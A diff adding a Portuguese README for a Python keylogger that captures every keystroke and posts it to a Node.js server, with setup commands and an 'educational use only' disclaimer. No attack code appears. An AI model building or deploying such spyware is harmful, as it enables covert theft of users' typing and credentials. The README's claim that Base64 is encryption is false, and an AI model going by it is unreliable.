@@ -1,0 +1,41 @@
+# Keylogger com Envio Criptografado
+
+Este é um simples agente de keylogger em Python que captura as teclas pressionadas pelo usuário e envia os dados criptografados em Base64 para um servidor Node.js. 
+
+## Funcionalidades
+
+- Captura de todas as teclas pressionadas pelo usuário.
+- Criptografia dos dados capturados em Base64 antes do envio para o servidor.
+- Envio dos dados capturados para um servidor Node.js via HTTP POST.
+
+## Requisitos do Sistema
+
+- Python 3
+- Nodejs
+- Npm 
+
+## Configuração
+
+1. Crie uma .env para o projeto
+``` 
+    python -m venv .env
+    pip install -r requirements.txt
+
+```
+2. Crie as configuracoes iniciais do node
+``` 
+    npm init -y
+    npm install
+
+```
+3. Rode o servidor
+```
+    node Sow.js
+
+```
+
+
+
+## Aviso Legal
+
+Este projeto é fornecido apenas para fins educacionais e de teste. Não sou responsável pelo uso indevido ou ilegal deste software.
